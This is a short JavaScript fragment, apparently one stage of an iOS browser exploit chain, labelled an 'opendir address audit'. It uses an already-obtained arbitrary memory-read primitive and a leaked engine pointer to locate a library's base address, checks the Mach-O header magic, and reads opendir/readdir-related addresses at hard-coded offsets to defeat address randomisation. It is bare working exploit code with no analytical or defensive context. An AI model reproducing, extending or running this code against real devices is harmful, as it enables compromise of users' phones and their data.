/* ===== iOS 27 opendir address audit ===== */
  var MK = setres;
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
  if ((rd32_(base) >>> 0) !== 0xfeedfacf) { MK('P_NO_BASE'); return; }
  var F = RD(js_free + 0x29ba084n);
  var OP = u64(F + 0x79bc278n);
  var RDIR = u64(F + 0x79bc3e4n);
  var CD = u64(OP - 0x5714n);
  MK('P F=' + hex(F) + ' O=' + hex(OP) + ' M=' + hex(rd32_(CD)) +
     ' 0=' + hex(RD(OP)) + ' 8=' + hex(RD(OP + 8n)) +
     ' R=' + hex(RD(RDIR)) + ' R8=' + hex(RD(RDIR + 8n)) +
     ' OPN=' + hex(RD(u64(F + 0xb79b52bcn))));
